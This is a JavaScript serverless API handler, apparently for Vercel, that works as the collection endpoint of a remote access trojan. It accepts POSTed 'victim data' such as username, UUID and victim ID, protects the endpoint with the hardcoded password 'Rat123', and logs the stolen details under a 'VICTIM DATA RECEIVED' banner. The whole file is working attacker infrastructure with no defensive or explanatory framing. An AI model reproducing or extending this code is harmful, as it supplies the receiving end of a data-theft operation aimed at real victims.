// api/data.js
export default function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Password');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Only accept POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { password, data } = req.body;

        // Check password
        if (password !== "Rat123") {
            return res.status(401).json({ error: 'Unauthorized' });
        }

        // Log the received data (Vercel logs)
        console.log('=== VICTIM DATA RECEIVED ===');
        console.log('Time:', new Date().toISOString());
        console.log('Username:', data.username);
        console.log('UUID:', data.uuid);
        console.log('Victim ID:', data.victim_id);
        console.log('Full data:', JSON.stringify(data, null, 2));
        console.log('===========================');

        // Here you would typically save to a database
        // For now, we'll return success and let the frontend handle it

        return res.status(200).json({ 
            success: true, 
            message: 'Data received',
            victim_id: data.victim_id 
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}
